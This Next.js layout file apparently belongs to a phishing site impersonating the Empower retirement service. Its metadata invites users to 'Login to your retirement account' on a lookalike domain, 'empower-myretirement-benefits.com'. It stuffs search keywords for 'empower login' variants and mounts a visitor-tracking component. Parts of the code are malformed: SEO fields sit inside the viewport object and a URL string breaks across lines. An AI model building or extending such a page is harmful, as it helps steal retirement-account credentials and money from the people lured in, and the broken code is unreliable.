import type React from "react"
import type { Metadata } from "next"
import { Open_Sans, Arimo } from "next/font/google"
import { Analytics } from "@vercel/analytics/next"
import { VisitorTracker } from "@/components/visitor-tracker"
import "./globals.css"

const openSans = Open_Sans({ subsets: ["latin"] })
const arimo = Arimo({ subsets: ["latin"] })

export const metadata: Metadata = {
  title: "Empower - Your Retirement Plan",
  description: "Empower your financial freedom today. Login to your retirement account.",
  generator: "v0.app",
  openGraph: {
    title: "Empower - Your Retirement Plan",
    description: "Empower your financial freedom today. Login to your retirement account.",
    type: "website",
  },
  twitter: {
    card: "summary",
    title: "Empower - Your Retirement Plan",
    description: "Empower your financial freedom today. Login to your retirement account.",
  },
}

export const viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 5,
  userScalable: true,

  keywords: [
    "empower retirement",
    "empower login",
    "empower 401k login",
    "empower retirement account",
    "empower sign in",
    "empower retirement plan",
    "empower financial freedom",
    "empower retirement services",
    "empower account access",
    "empower retirement management",
    "empower retirement login",
    "empower",
    "empowermyretirement login",
    "empower retirement login portal",
    "empower retirement account login",
    "empower retirement plan login",
    "empower retirement services login",
    "empower retirement management login",
    "empower financial freedom login",
    "empower account access login",
    "empowerretirement",
  ],

  openGraph: {
    type: 'empower-retirement',
    url: "https://empower-myretirement-benefits.com
",
    siteName: "empower-retirement",
  }




}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="en">
      <body className={`${openSans.className} antialiased bg-[#f5f5f5]`}>
        <VisitorTracker />
        <div className="max-w-[1440px] mx-auto bg-white min-h-screen shadow-2xl overflow-x-hidden">
          {children}
        </div>
        <Analytics />
      </body>
    </html>
  )
}
